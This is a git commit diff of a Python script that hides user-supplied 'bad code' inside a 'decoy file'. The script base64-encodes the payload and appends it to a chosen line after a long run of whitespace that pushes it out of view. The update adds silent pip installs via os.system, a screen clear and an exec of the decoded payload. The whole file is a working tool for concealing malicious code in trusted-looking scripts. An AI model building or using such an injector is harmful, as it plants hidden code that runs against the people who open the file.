167efec392d12b2466aee1a7cb10a85272933bf6
K.Dot <110929758+KDot227@users.noreply.github.com>
2022-09-08 21:30:47 -0500

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,8 @@
 import os
 import time
 __author__ = "K.Dot#0001"
+
+
 def main():
     import base64
     text = ""
@@ -13,17 +15,29 @@ def main():
         enc_txt =  base64.b64encode(text)
 
     input2 = input("what is the decoy file location? ")
-    part = input("What what line would you like to start the bad code? ")
-
-    with open(input2, 'r', encoding="utf8", errors="ignore") as file:
-        data = file.readlines()
-
-    codes = f";                                                                                                                                                                                                                                      import base64; exec(base64.b64decode({enc_txt}))\n"
-    try: 
-        data[int(part)-1] = data[int(part)-1].strip() + codes
-    except:
-        print("Error: Line number is out of range")
-
+    part = input("What line would you like to start the bad code? ")
+    print("""
+    This next part has to be done right or else the script will not work.
+    You will need to put any imports that need to be required via pip
+    Example: requests
+    """)
+    imports_total = ""
+    while True:
+        imports = input("Enter any imports that need to be installed via pip: ")
+        if imports == "":
+            break
+        imports_total += f" {imports};"
+    with open(input2, "r", encoding="utf8", errors="ignore") as f:
+        data = f.readlines()
+        if imports_total == "":
+            codes = f";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  import base64; exec(base64.b64decode({enc_txt}))\n"
+        else:
+            new_code = imports_total.replace(";", ",")
+            codes = f";                                                                                                                                                                                                                                                                                                                                                print('you found an easter egg!!!');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                import {new_code} base64, os; os.system('pip install {imports_total}'); os.system('cls'); exec(base64.b64decode({enc_txt}))\n"
+        try: 
+            data[int(part)-1] = data[int(part)-1].strip() + codes
+        except:
+            print("Error: Line number is out of range")
     with open('obfuscated.py', 'w', encoding="utf8", errors="ignore") as file:
         file.writelines( data )
 
